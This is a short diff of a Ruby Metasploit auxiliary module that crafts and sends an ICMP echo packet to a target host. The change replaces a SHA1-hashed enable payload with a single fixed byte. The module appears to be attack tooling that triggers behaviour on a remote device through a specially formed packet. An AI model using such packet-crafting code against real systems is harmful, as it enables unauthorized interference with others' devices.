@@ -35,7 +35,6 @@ class Metasploit3 < Msf::Auxiliary
 
     @lhost = IPAddr.new datastore['LHOST']
     @rhost = IPAddr.new datastore['RHOST']
-    @enable = (datastore['ENABLE'] ? 1 : 0)
 
     capture_sendto(icmp_packet, @rhost.to_s)
 
@@ -44,12 +43,8 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def icmp_payload
-    cmd = [1].pack('N')
-    data_enable = [@enable].pack('N')
-    blank = [0].pack('N')
-    hash_data =  "#{data_enable}#{blank}#{@rhost.hton}"
-    hash = Digest::SHA1.hexdigest hash_data
-    "#{[hash].pack('H*')}#{cmd}#{data_enable}#{blank}"
+    cmd = [88].pack('C')
+    cmd
   end
 
   def icmp_packet
@@ -58,7 +53,7 @@ class Metasploit3 < Msf::Auxiliary
     icmp.ip_src = @lhost.hton
     icmp.ip_dst = @rhost.hton
     icmp.icmp_type = 8
-    icmp.payload = capture_icmp_echo_pack(1, 1, icmp_payload << Rex::Text.rand_text(26))
+    icmp.payload = capture_icmp_echo_pack(0, 0, icmp_payload)
     icmp.recalc
     print_status("Sending payload")
     icmp
